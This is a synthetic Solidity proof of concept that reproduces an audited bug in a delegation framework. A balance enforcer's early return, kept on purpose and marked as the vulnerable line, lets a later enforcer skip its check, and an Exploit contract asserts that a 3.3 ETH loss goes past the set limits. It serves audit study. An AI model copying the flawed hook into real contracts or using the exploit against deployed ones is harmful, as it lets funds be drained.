// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    MetaMask Delegation Framework — TotalBalanceEnforcer validation bypass
    when mixed with state-modifying enforcers
    (Cyfrin 2025-09, finding #64325)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: afterAllHook early-returns when the shared BalanceTracker has
    already been cleaned (expectedIncrease == 0 && expectedDecrease == 0).
    A first TotalBalanceEnforcer validates and deletes the tracker; a mid-chain
    NativeTokenPaymentEnforcer then moves ETH; a later TotalBalanceEnforcer
    hits the early return and never validates the final balance — so a
    max-decrease constraint is silently bypassed.

    Vulnerable line preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

struct BalanceTracker {
    uint256 balanceBefore;
    uint256 expectedIncrease;
    uint256 expectedDecrease;
}

/// @notice Reduced NativeTokenTotalBalanceChangeEnforcer.
contract TotalBalanceEnforcer {
    mapping(bytes32 => BalanceTracker) public balanceTracker;

    function beforeAllHook(bytes32 hashKey, address recipient, uint256 maxDecrease) external {
        BalanceTracker storage t = balanceTracker[hashKey];
        if (t.balanceBefore == 0 && t.expectedIncrease == 0 && t.expectedDecrease == 0) {
            t.balanceBefore = recipient.balance;
        }
        t.expectedDecrease += maxDecrease;
    }

    // ============================================================
    //  Vulnerable afterAllHook — early return after shared cleanup
    // ============================================================
    function afterAllHook(bytes32 hashKey, address recipient) public {
        BalanceTracker memory balanceTracker_ = balanceTracker[hashKey];

        // Early return when tracker already cleaned by a prior
        // TotalBalanceEnforcer in the same chain. Subsequent enforcers skip
        // validation even after a state-modifying enforcer changed balances.
        // FIX: track validationsRemaining; only delete when count hits 0.
        if (balanceTracker_.expectedIncrease == 0 && balanceTracker_.expectedDecrease == 0) return; // @> VULN: early return bypass

        uint256 balanceAfter = recipient.balance;
        uint256 balanceBefore = balanceTracker_.balanceBefore;

        if (balanceAfter < balanceBefore) {
            uint256 decrease = balanceBefore - balanceAfter;
            require(decrease <= balanceTracker_.expectedDecrease, "TotalBalance: decrease exceeded");
        }
        // Cleanup after first validation — leaves later enforcers blind.
        delete balanceTracker[hashKey];
    }
}

/// @notice Reduced NativeTokenPaymentEnforcer — pulls ETH from the account
///         during afterAllHook (state-modifying enforcer).
contract PaymentEnforcer {
    function afterAllHook(AliceAccount from, address recipient, uint256 amount) external {
        // Real: delegationManager.redeemDelegations(...) transfers from Alice.
        from.sendPayment(recipient, amount);
    }
}

/// @dev Alice's smart account — holds ETH and is the sharedRecipient.
contract AliceAccount {
    TotalBalanceEnforcer public balEnf;
    PaymentEnforcer public payEnf;
    address public bobPaymentRecipient;
    bool public executed;

    constructor(TotalBalanceEnforcer b, PaymentEnforcer p, address bobPay) {
        balEnf = b;
        payEnf = p;
        bobPaymentRecipient = bobPay;
    }

    receive() external payable {}

    function sendPayment(address to, uint256 amount) external {
        require(msg.sender == address(payEnf), "only pay enf");
        (bool ok,) = to.call{value: amount}("");
        require(ok, "pay");
    }

    /// @dev Simulates 3-delegation afterAllHook order (root → leaf):
    ///      1) Alice TotalBalanceEnforcer (max dec 1 ETH) — validates & cleans
    ///      2) Bob PaymentEnforcer — pulls 3 ETH from Alice to Bob
    ///      3) Dave TotalBalanceEnforcer (max dec 0.5 ETH) — early return BYPASS
    function executeChain(
        bytes32 hashKey,
        address primaryTarget,
        uint256 primaryValue,
        uint256 paymentAmount
    ) external {
        // beforeAll: Alice + Dave accumulate decrease limits (shared key).
        balEnf.beforeAllHook(hashKey, address(this), 1 ether);
        balEnf.beforeAllHook(hashKey, address(this), 0.5 ether);

        // Primary execution: transfer 0.3 ETH.
        (bool ok,) = primaryTarget.call{value: primaryValue}("");
        require(ok, "primary");

        // afterAll (root → leaf):
        balEnf.afterAllHook(hashKey, address(this)); // Alice: pass, DELETE tracker
        payEnf.afterAllHook(this, bobPaymentRecipient, paymentAmount); // Bob: +3 ETH out
        balEnf.afterAllHook(hashKey, address(this)); // Dave: early return BYPASS

        executed = true;
    }
}

contract Sink {
    receive() external payable {}
}

contract BobRecipient {
    receive() external payable {}
}

/// @dev CREATE order: 1 balEnf, 2 payEnf, 3 sink, 4 bob, 5 alice
///      Fund Alice via payable run() (attackValueWei).
contract Exploit {
    TotalBalanceEnforcer public balEnf; // nonce 1 — vulnerable
    PaymentEnforcer public payEnf; // nonce 2
    Sink public sink; // nonce 3
    BobRecipient public bob; // nonce 4
    AliceAccount public alice; // nonce 5

    uint256 public constant PRIMARY = 0.3 ether;
    uint256 public constant PAYMENT = 3 ether;
    uint256 public constant ALICE_START = 10 ether;

    constructor() {
        balEnf = new TotalBalanceEnforcer();
        payEnf = new PaymentEnforcer();
        sink = new Sink();
        bob = new BobRecipient();
        alice = new AliceAccount(balEnf, payEnf, address(bob));
    }

    function run() external payable {
        require(msg.value >= ALICE_START, "need alice funds");
        (bool funded,) = address(alice).call{value: ALICE_START}("");
        require(funded, "fund alice");

        uint256 aliceBefore = address(alice).balance;
        require(aliceBefore == ALICE_START, "alice funded");

        // Under correct enforcement the final 3.3 ETH decrease would exceed
        // both Alice's 1 ETH and Dave's 0.5 ETH max — must revert.
        // Under the bug, Dave's early return lets execution succeed.
        bytes32 hashKey = keccak256("shared-recipient-key");
        alice.executeChain(hashKey, address(sink), PRIMARY, PAYMENT);

        uint256 totalDecrease = aliceBefore - address(alice).balance;
        uint256 bobGot = address(bob).balance;

        // HARM: balance constraint bypassed — Alice lost 3.3 ETH, Bob got 3 ETH.
        require(alice.executed(), "chain should complete under the bug");
        require(totalDecrease == PRIMARY + PAYMENT, "unexpected decrease");
        require(bobGot == PAYMENT, "bob not paid");
        require(totalDecrease > 1 ether, "harm: exceeds Alice max decrease");
        require(totalDecrease > 0.5 ether, "harm: exceeds Dave max decrease");
    }

    receive() external payable {}
}
